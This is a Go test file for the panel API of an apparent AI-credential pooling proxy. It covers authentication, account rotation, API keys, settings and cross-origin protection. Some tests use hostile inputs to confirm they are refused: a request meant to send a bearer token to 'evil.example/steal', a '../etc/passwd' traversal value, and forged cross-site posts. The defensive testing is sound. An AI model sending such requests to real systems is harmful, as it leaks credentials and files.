package app

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/kacperkwapisz/mainspring/internal/domain"
	"github.com/kacperkwapisz/mainspring/internal/proxy"
	"github.com/kacperkwapisz/mainspring/internal/route"
	"github.com/kacperkwapisz/mainspring/internal/store"
)

func bootAPI(t *testing.T) *Booted { t.Helper(); return bootAPIWith(t, nil) }

func bootAPIWith(t *testing.T, vars map[string]string) *Booted {
	t.Helper()
	src := map[string]string{"JWT_SECRET": secret, "DATABASE_PATH": ":memory:"}
	for k, v := range vars {
		src[k] = v
	}
	booted, err := Create(src)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { booted.DB.Close() })
	return booted
}

// apiCall sends an authed panel API request and decodes the JSON answer.
func apiCall(t *testing.T, b *Booted, method, path string, body any) (int, map[string]any) {
	t.Helper()
	var buf bytes.Buffer
	if body != nil {
		_ = json.NewEncoder(&buf).Encode(body)
	}
	req := httptest.NewRequest(method, path, &buf)
	req.Header.Set("Content-Type", "application/json")
	authPanel(t, b, req)
	res := httptest.NewRecorder()
	b.Handler.ServeHTTP(res, req)
	var out map[string]any
	_ = json.Unmarshal(res.Body.Bytes(), &out)
	return res.Code, out
}

func saveCred(t *testing.T, b *Booted, p domain.ProviderID, label string) domain.Credential {
	t.Helper()
	c, err := b.Hub.Vault.Save(store.SaveCredential{Provider: p, Label: label, Tokens: domain.CredentialTokens{AccessToken: "t", Email: label, Extra: map[string]any{}}})
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func TestAPIRequiresPanelSession(t *testing.T) {
	b := bootAPI(t)
	for _, path := range []string{"/api/pool", "/api/sessions", "/api/meter", "/api/keys", "/api/settings", "/api/models", "/api/updates", "/api/changelog", "/api/log", "/api/errors"} {
		res := httptest.NewRecorder()
		b.Handler.ServeHTTP(res, httptest.NewRequest(http.MethodGet, path, nil))
		if res.Code != 401 || !strings.Contains(res.Body.String(), "panel_signed_out") {
			t.Fatalf("%s: %d %s", path, res.Code, res.Body.String())
		}
	}
}

func TestAPIPoolOrdersAndExplains(t *testing.T) {
	b := bootAPI(t)
	now := time.Now().UnixMilli()
	a := saveCred(t, b, domain.ProviderClaude, "a@x.pl")
	c := saveCred(t, b, domain.ProviderClaude, "c@x.pl")
	d := saveCred(t, b, domain.ProviderClaude, "d@x.pl")
	saveCred(t, b, domain.ProviderCursor, "cursor@x.pl")
	used := func(p float64) *float64 { return &p }
	at := func(ms int64) *int64 { return &ms }
	b.Hub.Router.ObserveWindows(a.ID, "headers", []route.Window{
		{ID: "claude-5h", Label: "5 hours", UsedPercent: used(62), ResetsAt: at(now + 3600_000), PeriodMS: 5 * 3600_000},
		{ID: "claude-7d", Label: "7 days", UsedPercent: used(81), ResetsAt: at(now + 19*3600_000), PeriodMS: 7 * 24 * 3600_000},
	})
	b.Hub.Router.ObserveWindows(c.ID, "headers", []route.Window{
		{ID: "claude-7d", Label: "7 days", UsedPercent: used(40), ResetsAt: at(now + 3*24*3600_000), PeriodMS: 7 * 24 * 3600_000},
	})
	b.Hub.Router.RateLimited(d.ID, route.Limit{Until: now + 50*60_000, Label: "5 hours", Account: true})

	code, pool := apiCall(t, b, http.MethodGet, "/api/pool", nil)
	if code != 200 {
		t.Fatalf("%d %v", code, pool)
	}
	groups := pool["groups"].([]any)
	if len(groups) != 1 {
		t.Fatalf("groups %v", groups)
	}
	g := groups[0].(map[string]any)
	if g["next_up"] != a.ID {
		t.Fatalf("next up %v", g["next_up"])
	}
	accounts := g["accounts"].([]any)
	statuses := []string{}
	for _, raw := range accounts {
		statuses = append(statuses, raw.(map[string]any)["status"].(string))
	}
	if strings.Join(statuses, ",") != "next,active,cooling" {
		t.Fatalf("statuses %v", statuses)
	}
	first := accounts[0].(map[string]any)
	if first["long"].(map[string]any)["left"].(float64) != 19 || first["short"].(map[string]any)["left"].(float64) != 38 {
		t.Fatalf("windows %v", first)
	}
	if others := pool["others"].([]any); len(others) != 1 {
		t.Fatalf("others %v", others)
	}
}

func TestAPIBenchRenameRemove(t *testing.T) {
	b := bootAPI(t)
	a := saveCred(t, b, domain.ProviderClaude, "a@x.pl")
	code, out := apiCall(t, b, http.MethodPost, "/api/accounts/"+a.ID+"/rotation", map[string]any{"on": false})
	if code != 200 || out["account"].(map[string]any)["status"] != "benched" {
		t.Fatalf("%d %v", code, out)
	}
	code, out = apiCall(t, b, http.MethodPost, "/api/accounts/"+a.ID+"/rename", map[string]any{"name": "Main"})
	if code != 200 || out["account"].(map[string]any)["label"] != "Main" {
		t.Fatalf("%d %v", code, out)
	}
	code, _ = apiCall(t, b, http.MethodDelete, "/api/accounts/"+a.ID, nil)
	if code != 200 {
		t.Fatal(code)
	}
	if code, _ = apiCall(t, b, http.MethodGet, "/api/accounts/"+a.ID, nil); code != 404 {
		t.Fatal(code)
	}
}

func TestAPIKeysCreateListRevoke(t *testing.T) {
	b := bootAPI(t)
	code, out := apiCall(t, b, http.MethodPost, "/api/keys", map[string]any{"name": "laptop", "providers": []string{"claude", "codex"}, "daily_cap": "20M"})
	if code != 200 || !strings.HasPrefix(out["secret"].(string), "sk-ms-") {
		t.Fatalf("%d %v", code, out)
	}
	key := out["key"].(map[string]any)
	if key["daily_cap"].(float64) != 20_000_000 {
		t.Fatalf("cap %v", key)
	}
	if code, out = apiCall(t, b, http.MethodPost, "/api/keys", map[string]any{"name": "Laptop"}); code != 400 || out["error"].(map[string]any)["code"] != "name_taken" {
		t.Fatalf("dupe %d %v", code, out)
	}
	_, list := apiCall(t, b, http.MethodGet, "/api/keys", nil)
	if n := len(list["keys"].([]any)); n != 1 {
		t.Fatalf("keys %d", n)
	}
	if code, _ = apiCall(t, b, http.MethodPost, "/api/keys/"+key["id"].(string)+"/revoke", nil); code != 200 {
		t.Fatal(code)
	}
	_, list = apiCall(t, b, http.MethodGet, "/api/keys", nil)
	if n := len(list["keys"].([]any)); n != 0 {
		t.Fatalf("revoked key still listed: %d", n)
	}
}

func TestAPISettingsRoundTrip(t *testing.T) {
	b := bootAPI(t)
	code, out := apiCall(t, b, http.MethodPut, "/api/settings", map[string]any{"affinity_minutes": 90, "trace": "errors", "websockets": false})
	if code != 200 || out["affinity_minutes"].(float64) != 90 || out["trace"] != "errors" || out["websockets"] != false {
		t.Fatalf("%d %v", code, out)
	}
	if b.Hub.Router.AffinityTTL() != 90*time.Minute {
		t.Fatal("affinity ttl not applied")
	}
	if code, _ = apiCall(t, b, http.MethodPut, "/api/settings", map[string]any{"affinity_minutes": 1}); code != 400 {
		t.Fatal("out-of-range minutes must fail")
	}
	if code, _ = apiCall(t, b, http.MethodPut, "/api/settings", map[string]any{"hub_enabled": true}); code != 400 {
		t.Fatal("hub needs a key first")
	}
}

func TestAPITimezoneSetting(t *testing.T) {
	b := bootAPI(t)
	if proxy.Zone(b.Hub) != time.UTC {
		t.Fatal("days count in UTC until a timezone is set")
	}
	code, out := apiCall(t, b, http.MethodPut, "/api/settings", map[string]any{"timezone": "Europe/Warsaw"})
	if code != 200 || out["timezone"] != "Europe/Warsaw" || proxy.Zone(b.Hub).String() != "Europe/Warsaw" {
		t.Fatalf("%d %v", code, out)
	}
	for _, bad := range []string{"", "Local", "Mars/Olympus", "../etc/passwd"} {
		if code, _ := apiCall(t, b, http.MethodPut, "/api/settings", map[string]any{"timezone": bad}); code != 400 {
			t.Fatalf("%q must fail", bad)
		}
	}
}

func TestManagementAPIForUsageDashboards(t *testing.T) {
	b := bootAPI(t)
	a := saveCred(t, b, domain.ProviderCodex, "k@x.pl")
	req := httptest.NewRequest(http.MethodGet, "/v0/management/auth-files", nil)
	res := httptest.NewRecorder()
	b.Handler.ServeHTTP(res, req)
	if res.Code != 401 {
		t.Fatalf("off by default: %d", res.Code)
	}
	_, out := apiCall(t, b, http.MethodPost, "/api/settings/hub-key", nil)
	key := out["secret"].(string)
	req = httptest.NewRequest(http.MethodGet, "/v0/management/auth-files", nil)
	req.Header.Set("Authorization", "Bearer "+key)
	res = httptest.NewRecorder()
	b.Handler.ServeHTTP(res, req)
	if res.Code != 200 || !strings.Contains(res.Body.String(), a.ID) || !strings.Contains(res.Body.String(), `"provider":"codex"`) {
		t.Fatalf("%d %s", res.Code, res.Body.String())
	}
	body := strings.NewReader(`{"auth_index":"` + a.ID + `","method":"GET","url":"https://evil.example/steal","header":{"Authorization":"Bearer $TOKEN$"}}`)
	req = httptest.NewRequest(http.MethodPost, "/v0/management/api-call", body)
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("Content-Type", "application/json")
	res = httptest.NewRecorder()
	b.Handler.ServeHTTP(res, req)
	if res.Code != 403 {
		t.Fatalf("non-usage URLs must be refused: %d", res.Code)
	}
}

func TestPanelServesAppAndAssets(t *testing.T) {
	b := bootAPI(t)
	get := func(path string) *httptest.ResponseRecorder {
		res := httptest.NewRecorder()
		b.Handler.ServeHTTP(res, httptest.NewRequest(http.MethodGet, path, nil))
		return res
	}
	if res := get("/"); res.Code != 200 || !strings.Contains(res.Body.String(), `x-data="app"`) || strings.Contains(res.Body.String(), "{{VERSION}}") {
		t.Fatalf("index %d", res.Code)
	}
	for path, ctype := range map[string]string{
		"/assets/app.js":            "text/javascript",
		"/assets/app.css":           "text/css",
		"/assets/ding.js":           "text/javascript",
		"/assets/alpine.min.js":     "text/javascript",
		"/assets/mark.svg":          "image/svg+xml",
		"/assets/fonts/inter.woff2": "font/woff2",
	} {
		res := get(path)
		if res.Code != 200 || !strings.HasPrefix(res.Header().Get("Content-Type"), ctype) {
			t.Fatalf("%s: %d %s", path, res.Code, res.Header().Get("Content-Type"))
		}
	}
	if res := get("/assets/index.html"); res.Code != 404 {
		t.Fatalf("index via assets: %d", res.Code)
	}
	if res := get("/assets/nope.js"); res.Code != 404 {
		t.Fatalf("missing asset: %d", res.Code)
	}
}

func TestPanelAPIRefusesCrossSiteWrites(t *testing.T) {
	booted, err := Create(map[string]string{"JWT_SECRET": secret, "DATABASE_PATH": ":memory:", "MAINSPRING_AUTH": "proxy"})
	if err != nil {
		t.Fatal(err)
	}
	defer booted.DB.Close()
	send := func(origin, ctype, body string) int {
		req := httptest.NewRequest(http.MethodPost, "http://umbrel.local:8317/api/keys", strings.NewReader(body))
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		if ctype != "" {
			req.Header.Set("Content-Type", ctype)
		}
		res := httptest.NewRecorder()
		booted.Handler.ServeHTTP(res, req)
		return res.Code
	}
	// A form on another site, and JSON from another origin, are both refused.
	if code := send("https://evil.example", "application/x-www-form-urlencoded", "name=x"); code != 403 {
		t.Fatalf("cross-site form: %d", code)
	}
	if code := send("", "text/plain", `{"name":"x"}`); code != 403 {
		t.Fatalf("text/plain body: %d", code)
	}
	if code := send("https://evil.example", "application/json", `{"name":"x"}`); code != 403 {
		t.Fatalf("foreign origin: %d", code)
	}
	// The panel itself, same origin, works without signing in behind a proxy.
	if code := send("http://umbrel.local:8317", "application/json", `{"name":"laptop"}`); code != 200 {
		t.Fatalf("same origin: %d", code)
	}
	// Reads stay allowed so the page can load.
	req := httptest.NewRequest(http.MethodGet, "/api/pool", nil)
	req.Header.Set("Origin", "https://evil.example")
	res := httptest.NewRecorder()
	booted.Handler.ServeHTTP(res, req)
	if res.Code != 200 {
		t.Fatalf("GET pool: %d", res.Code)
	}
}
